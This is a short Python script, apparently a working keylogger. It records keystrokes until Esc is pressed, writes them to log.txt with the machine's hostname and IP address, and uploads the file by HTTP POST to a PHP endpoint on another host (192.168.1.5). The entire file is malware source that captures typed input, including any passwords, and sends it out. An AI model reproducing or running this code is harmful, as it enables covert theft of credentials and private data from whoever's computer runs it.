import keyboard
import requests
import socket

# Recording keys
keys = keyboard.record(until='esc')
parsed_keys = []
for key in keys:
    str_key = str(key)
    raw_key = str_key.split("(")[1].split(")")[0]
    parsed_keys.append(raw_key)

# Write the keys to a file
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

with open("log.txt", "w") as f:
    f.write(f"Keys recorded on {hostname}:{ip_address}:\n")
    for key in parsed_keys:
        f.write(key + "\n")
        
# Send the file to a remote server
with open("log.txt", "rb") as f:
    response = requests.post(
        "http://192.168.1.5/upload.php",
        files={"file": f}
    )

print(response.text)
# Check if the upload was successful
if response.status_code == 200:
    print("File uploaded successfully.")